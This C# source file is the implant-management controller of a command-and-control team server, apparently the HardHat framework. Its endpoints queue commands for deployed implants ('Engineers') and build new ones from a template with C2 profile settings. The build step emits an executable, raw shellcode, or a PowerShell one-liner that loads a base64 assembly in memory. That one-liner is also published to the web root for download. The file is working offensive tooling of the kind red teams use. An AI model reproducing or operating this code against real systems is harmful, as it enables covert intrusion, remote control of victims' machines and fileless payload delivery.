using ApiModels.Requests;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using TeamServer.Models;
using TeamServer.Services;
using System.Linq;
using TeamServer.Models.Extras;
using System.Threading;
using System.Runtime.InteropServices;
using TeamServer.Models.Managers;
using TeamServer.Utilities;

namespace TeamServer.Controllers
{
	[ApiController]
	[Route("[controller]")]
	public class EngineersController : ControllerBase
	{
		// class member variables 
		private readonly IEngineerService _Engineers;

		// Constructor
		public EngineersController(IEngineerService Engineers)  //done in constructor because it can use the depedency injection to grab that service info. 
		{
			_Engineers = Engineers;
		}
		
		// API methods and functions 
		[HttpGet(Name = "RetrieveAllEngineers")]
		public IActionResult GetEngineers()
		{
			var Engineers = _Engineers.GetEngineers();
			return Ok(Engineers);
		}

		[HttpGet("{EngineerId}", Name = "RetrieveEngineer")]
		public IActionResult GetEngineer(string EngineerId)
		{
			var Engineer = _Engineers.GetEngineer(EngineerId);
			if (Engineer is null)
			{ return NotFound(); }
			return Ok(Engineer);
		}

		[HttpGet("{EngineerId}/tasks/{taskId}", Name = "RetrieveEngineerTaskResults")]
		public IActionResult GetTaskResult(string EngineerId, string taskId)
		{
			var Engineer = _Engineers.GetEngineer(EngineerId);
			if (Engineer is null) return NotFound("Engineer not found");

			var result = Engineer.GetTaskResult(taskId);
			if (result is null) return NotFound("Task not found");

			return Ok(result);
		}

		[HttpGet("{EngineerId}/tasks", Name = "RetrieveAllEngineerTasks")]
		public IActionResult GetTaskResults(string EngineerId)
		{
			var Engineer = _Engineers.GetEngineer(EngineerId);
			if (Engineer is null) return NotFound("Engineer not found");

			var results = Engineer.GetTaskResults();
			return Ok(results);
		}

		[HttpPost("{EngineerId}", Name = "TaskEngineer")]
		public IActionResult TaskEngineer(string engineerId, [FromBody] TaskEngineerRequest request)
		{
			var engineer = _Engineers.GetEngineer(engineerId);
			if (engineer is null) return NotFound();

			var task = new EngineerTask(request.taskID,request.Command,request.Arguments,request.File, request.IsBlocking);

			if (engineer.QueueTask(task))
			{
				var root = $"{HttpContext.Request.Scheme}://{HttpContext.Request.Host}{HttpContext.Request.Path}";
				var path = $"{root}/tasks/{task.Id}";
                //if task.Arguments is not null, turn the dictionary into a string like /key1 value1 /key2 value2 etc
                var args = task.Arguments is null ? "" : string.Join(" ", task.Arguments.Select(kvp => $"{kvp.Key} {kvp.Value}"));
                //add the engineerId as the key with a new list of EngineerTask to the Engineer.Previous task Dictionary and add the task to the list of tasks for the engineer
                if(Engineer.previousTasks.ContainsKey(engineerId))
				{
					Engineer.previousTasks[engineerId].Add(task);
				}
				else
				{
					Engineer.previousTasks.Add(engineerId, new List<EngineerTask>() { task });
				}

                HardHatHub.UpdateOutgoingTaskDic(engineerId, task.Id, task.Command, args);
				HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"task {task.Command} {args} queued for execution", Status = "info" });
				return Created(path, task);
			}
            return NotFound();
        }
        
		[HttpPost(Name = "CreateEngineer")]
		public IActionResult CreateEngineer([FromBody] SpawnEngineerRequest request)
		{
			char allPlatformPathSeperator = Path.DirectorySeparatorChar;
			// find the Engineer cs file and load it to a string so we can update it and then run the compiler function on it
			string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
			//split path at bin keyword
			string[] pathSplit = path.Split("bin"); //[0] is the parent folder [1] is the bin folder
            //update each string in the array to replace \\ with the correct path seperator
            pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
            pathSplit[1] = pathSplit[1].Replace("\\", allPlatformPathSeperator.ToString());

            string filePath = pathSplit[0] + $"..{allPlatformPathSeperator}Engineer" + $"{allPlatformPathSeperator}Program.cs";
            string file = System.IO.File.ReadAllText(filePath);

            //usinf request.managerName to find the correct manager object and then get its BindAddress and BindPort from the manager object
            //then using the BindAddress and BindPort to update the file
            string managerName = request.managerName;
			int connectionAttempts = request.ConnectionAttempts;
            int sleep = request.Sleep;
            string managerBindAddress = "";
            string managerBindPort = "";
			string managerType = "";


            foreach (manager m in managerService._managers)
			{
                if (m.Type == manager.ManagerType.http || m.Type == manager.ManagerType.https)
				{
					Httpmanager manager = (Httpmanager)m;
                    if (manager.Name == managerName)
                    {
                        managerType = manager.Type.ToString();
                        managerBindAddress = manager.ConnectionAddress;
                        managerBindPort = manager.ConnectionPort.ToString();
                        file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                        file = file.Replace("{{REPLACE_MANAGER_TYPE}}", managerType);
                        //update some C2 Profile stuff 
                        file = file.Replace("{{REPLACE_URLS}}", manager.c2Profile.Urls);
                        file = file.Replace("{{REPLACE_COOKIES}}", manager.c2Profile.Cookies);
                        file = file.Replace("{{REPLACE_REQUEST_HEADERS}}", manager.c2Profile.RequestHeaders);
                        file = file.Replace("{{REPLACE_USERAGENT}}", manager.c2Profile.UserAgent);
                    }
                    if (manager.IsSecure)
                    {
                        file = file.Replace("{{REPLACE_ISSECURE_STATUS}}", "True");
                    }
                }
                else if(m.Type == manager.ManagerType.tcp)
				{
                    if (m.Name == managerName)
					{
						TCPManager manager = (TCPManager)m;
						//update file to update the BindPort, ListenPort, IsLocalHost Properties 
						file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
						file = file.Replace("{{REPLACE_MANAGER_TYPE}}", manager.Type.ToString());
						file = file.Replace("{{REPLACE_BIND_PORT}}", manager.BindPort.ToString());
						file = file.Replace("{{REPLACE_LISTEN_PORT}}", manager.ListenPort.ToString());
						file = file.Replace("{{REPLACE_ISLOCALHOSTONLY}}", manager.IsLocalHost.ToString());
						if (manager.connectionMode == TCPManager.ConnectionMode.bind)
						{
							file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "true");
						}
						else if (manager.connectionMode == TCPManager.ConnectionMode.reverse)
						{
							file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "false");
                            managerBindAddress = manager.ConnectionAddress;
                        }
					}
                }
                else if (m.Type == manager.ManagerType.smb)
                {


                    if (m.Name == managerName)
                    {
                        SMBmanager manager = (SMBmanager)m;
                        //update file to update the BindPort, ListenPort, IsLocalHost Properties 
                        file = file.Replace("{{REPLACE_MANAGER_NAME}}", managerName);
                        file = file.Replace("{{REPLACE_MANAGER_TYPE}}", manager.Type.ToString());
						file = file.Replace("{{REPLACE_NAMED_PIPE}}", manager.NamedPipe);
                        if (manager.connectionMode == SMBmanager.ConnectionMode.bind)
                        {
                            file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "true");
                        }
                        else if (manager.connectionMode == SMBmanager.ConnectionMode.reverse)
                        {
                            file = file.Replace("{{REPLACE_CHILD_IS_SERVER}}", "false");
                            managerBindAddress = manager.ConnectionAddress;
                        }
                    }
                }
            }
            //update file with connection attempts 
            file = file.Replace("{{REPLACE_CONNECTION_ATTEMPTS}}", connectionAttempts.ToString());
            //update file with sleep time
            file = file.Replace("{{REPLACE_SLEEP_TIME}}", sleep.ToString());

            //update file with ConnectionIP and ConnectionPort from request
            file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerBindAddress);
            file = file.Replace("{{REPLACE_CONNECTION_PORT}}", managerBindPort);
			if (request.WorkingHours != null)
			{
				file = file.Replace("{{REPLACE_WORK_HOURS_START}}", request.WorkingHours.Split('-')[0]);
				file = file.Replace("{{REPLACE_WORK_HOURS_END}}", request.WorkingHours.Split('-')[1]);
			}
			if (request.WorkingHours != null)
			{
				Console.WriteLine($"working hours is {request.WorkingHours.Split('-')[0]} and {request.WorkingHours.Split('-')[1]}");
			}
            
			//update the two univerisal strings as well 
			file = file.Replace("{{REPLACE_MESSAGE_PATH_KEY}}", Encryption.UniversialMessagePathKey); // used on C2 messages 
            file = file.Replace("{{REPLACE_METADATAID_KEY}}", Encryption.UniversialMetadataIdKey); // used on the metadata id header which is used to verify the implant is talking to the correct teamserver

			//string sleepFuncFile = System.IO.File.ReadAllText(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer"+$"{allPlatformPathSeperator}"+"Functions"+$"{allPlatformPathSeperator}"+"Sleepydll.cs");
            file = file.Replace("{{REPLACE_SLEEP_DLL}}", Convert.ToBase64String(System.IO.File.ReadAllBytes(pathSplit[0] + "Programs" + $"{allPlatformPathSeperator}" + "Extensions" + $"{allPlatformPathSeperator}" + "run3.dll")));

            //generate code for the implant
            byte[] assemblyBytes = Utilities.Compile.GenerateCode(file);
            if (assemblyBytes is null)
			{
				return BadRequest("Failed to compile Engineer, check teamServer Console for errors.");
			}
			try
			{
                //use ilMerge to merge the assembly and the protobuf dlls
                GC.Collect();
				GC.WaitForPendingFinalizers();
                System.IO.File.WriteAllBytes(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe", assemblyBytes);
                
                var outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                var sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                var netserlLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}NetSerializer.dll";
                var netstnlLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}netstandard.dll";
                var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";

                string[] assemblyArray = { sourceAssemblyLocation, netserlLocation, netstnlLocation};
                Utilities.MergeAssembly.MergeAssemblies(outputLocation, assemblyArray, searchDir);
            }
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
				Console.WriteLine(ex.StackTrace);
                return BadRequest("Merging of exe and needed dlls failed, check teamServer Console for errors.");
            }
			
            
            if (request.complieType == SpawnEngineerRequest.EngCompileType.exe)
			{
				try
				{
                    Console.WriteLine("Merged Engineer and needed dlls");
                    //System.IO.File.WriteAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe", assemblyBytes);
					var updatedExe = System.IO.File.ReadAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
                    //if file exists for delete it so write all bytes can work
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    System.IO.File.WriteAllBytes(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe", updatedExe); //make a copy of the engineer i nthe temp folder to use for some commands later
					//if enviornment is windows then run confuse 
					if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
					{
						//Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
					}
                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer compiled saved at {pathSplit[0]}..{ allPlatformPathSeperator }Engineer_{ managerName }.exe", Status = "success" });
					Thread.Sleep(10);
                    return Ok("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
				}
				catch (Exception ex)
				{
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                    return BadRequest("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe already exists.");
				}
			}
			else if (request.complieType == SpawnEngineerRequest.EngCompileType.shellcode)
			{
				try
				{
                    var updatedExe = System.IO.File.ReadAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
                    System.IO.File.WriteAllBytes(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe", updatedExe);
                    //call the shellcode utility giving it the path we just wrote this exe to then return the shellcode and write its content to a file 
                    var shellcodeLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe";
                    var shellcode = Utilities.Shellcode.AssemToShellcode(shellcodeLocation, "");
                    System.IO.File.WriteAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin", shellcode);

                    //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer shellcode written to {pathSplit[0]}..{ allPlatformPathSeperator }Engineer_{ managerName }_shellcode.bin", Status = "success" });
					return Ok("Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin");
				}
				catch (Exception)
				{
					return BadRequest("Engineer shellcode " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.bin already exists.");
				}
			}
            //if request.compileType is powershellcmd then convert the assemnbly bytes to a base64 string 
            else if (request.complieType == SpawnEngineerRequest.EngCompileType.powershellcmd)
            {
                try
                {
                    string binaryb64 = Convert.ToBase64String(assemblyBytes);
					string powershellCommand = $"$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{binaryb64}\"));$a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null";
                    //write the powershell command to a text file 
                    System.IO.File.WriteAllText(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
					System.IO.File.WriteAllText(pathSplit[0] + "wwwroot" + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", powershellCommand);
					HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer powershell command written to {allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", Status = "success" });
					HardHatHub.AddPsCommand(powershellCommand);
                    return Ok("Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt");
                }
                catch (Exception)
                {
                    return BadRequest("powershell cmd generation failed");
                }
            }
            return BadRequest("Failed to compile Engineer, check teamServer Console for errors.");

        }

	}
}
